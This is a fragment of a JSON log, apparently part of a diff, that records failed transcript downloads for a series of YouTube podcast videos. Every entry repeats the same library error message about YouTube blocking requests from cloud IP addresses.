-        "title": "Tony Fadell: How to build real taste (and why AI makes it matter more)",
-        "url": "https://www.youtube.com/watch?v=RJjl1TwyfWM",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=RJjl1TwyfWM! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] RJjl1TwyfWM: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "The most rational take on AI you’ll hear this year",
-        "url": "https://www.youtube.com/watch?v=BD3vLtWhT5A",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=BD3vLtWhT5A! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] BD3vLtWhT5A: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "What does the next training paradigm look like?",
-        "url": "https://www.youtube.com/watch?v=20p5-kQXF_Q",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=20p5-kQXF_Q! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] 20p5-kQXF_Q: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "The data black hole at the center of AI",
-        "url": "https://www.youtube.com/watch?v=4pG3SJQPAwk",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=4pG3SJQPAwk! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] 4pG3SJQPAwk: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "Machiavelli is the most misunderstood thinker of all time – Ada Palmer",
-        "url": "https://www.youtube.com/watch?v=U1FrhkLQnCI",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=U1FrhkLQnCI! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] U1FrhkLQnCI: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "Sarah Paine - Why Putin and Xi can't escape geography",
-        "url": "https://www.youtube.com/watch?v=OS1NZLgKM2c",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=OS1NZLgKM2c! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] OS1NZLgKM2c: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "The better AI gets, the smaller its share of the economy might get – Alex Imas and Phil Trammell",
-        "url": "https://www.youtube.com/watch?v=Jj-kBHzUohs",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=Jj-kBHzUohs! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] Jj-kBHzUohs: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "The Walt Disney Company: The most successful enterprise for monetizing human nostalgia (Audio)",
-        "url": "https://www.youtube.com/watch?v=7EUVr0-V6DA",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=7EUVr0-V6DA! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] 7EUVr0-V6DA: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "Vanguard: The communist capitalist who saved investors a trillion dollars (Audio)",
-        "url": "https://www.youtube.com/watch?v=ipiKIgdynZE",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=ipiKIgdynZE! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] ipiKIgdynZE: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "Ferrari: What happens when you staple a luxury brand to a sports team? (Audio)",
-        "url": "https://www.youtube.com/watch?v=JVO8roYiNXM",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=JVO8roYiNXM! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] JVO8roYiNXM: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "Formula 1: Fast cars, celebrities, and B2B software (Audio)",
-        "url": "https://www.youtube.com/watch?v=MyFzfgrZUYg",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=MyFzfgrZUYg! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] MyFzfgrZUYg: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "The NFL: How small-town teams became America's most valuable sports empire (Audio)",
-        "url": "https://www.youtube.com/watch?v=lYXKjuIHQIU",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=lYXKjuIHQIU! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] lYXKjuIHQIU: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "The Many Benefits of Coca — The “Divine Leaf” with 8,000+ Years of Use",
-        "url": "https://www.youtube.com/watch?v=gL48mHH6ul8",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=gL48mHH6ul8! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] gL48mHH6ul8: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "Lessons from 100+ AI Insiders on The Race to Superintelligence, The Religion of AI, and More",
-        "url": "https://www.youtube.com/watch?v=-UetKKxKqKU",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=-UetKKxKqKU! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] -UetKKxKqKU: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "The Path from The Soviet Union to Building Multi-Billion Dollar Companies — Max Levchin",
-        "url": "https://www.youtube.com/watch?v=uOjgVxOfxXo",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=uOjgVxOfxXo! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] uOjgVxOfxXo: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "Reimagining Biotech with Jake Becraft of Strand Therapeutics — Tim’s Founder Kitchen",
-        "url": "https://www.youtube.com/watch?v=mZ-vJ6kDRD0",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=mZ-vJ6kDRD0! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] mZ-vJ6kDRD0: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "AI Sells Labor, Not Software — Legendary Investor Elad Gil",
-        "url": "https://www.youtube.com/watch?v=RxWKVUWcUPM",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=RxWKVUWcUPM! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] RxWKVUWcUPM: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "Investing a $120 Billion Balance Sheet with No Outside Investors",
-        "url": "https://www.youtube.com/watch?v=OxHWFmFHnoc",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=OxHWFmFHnoc! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] OxHWFmFHnoc: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See https://github.com/yt-dlp/yt-dlp/wiki/FAQ#how-do-i-pass-cookies-to-yt-dlp for how to manually pass cookies. Also see https://github.com/yt-dlp/yt-dlp/wiki/Extractors#exporting-youtube-cookies for tips on effectively exporting YouTube cookies"
-      },
-      {
-        "type": "youtube",
-        "title": "Clay’s Unusual Path to Building a Multi-Billion Dollar Company",
-        "url": "https://www.youtube.com/watch?v=3bKLiUU2cb8",
-        "failure_reason": "youtube_transcript_api_error: Could not retrieve a transcript for the video https://www.youtube.com/watch?v=3bKLiUU2cb8! This is most likely caused by: YouTube is blocking requests from your IP. This usually is due to one of the following reasons: - You have done too many requests and your IP has been blocked by YouTube - You are doing requests from an IP belonging to a cloud provider (like AWS, Google Cloud Platform, Azure, etc.). Unfortunately, most IPs from cloud providers are blocked by YouTube. There are two things you can do to work around this: 1. Use proxies to hide your IP address, as explained in the \"Working around IP bans\" section of the README (https://github.com/jdepoix/youtube-transcript-api?tab=readme-ov-file#working-around-ip-bans-requestblocked-or-ipblocked-exception). 2. (NOT RECOMMENDED) If you authenticate your requests using cookies, you will be able to continue doing requests for a while. However, YouTube will eventually permanently ban the account that you have used to authenticate with! So only do this if you don't mind your account being banned! If you are sure that the described cause is not responsible for this error and that a transcript should be retrievable, please create an issue at https://github.com/jdepoix/youtube-transcript-api/issues. Please add which version of youtube_transcript_api you are using and provide the information needed to replicate the error. Also make sure that there are no open issues which already describe your problem!; yt_dlp_subtitle_error: ERROR: [youtube] 3bKLiUU2cb8: Sign in to confirm you’re not a bot. Use --cookies-from-browser or --cookies for the authentication. See 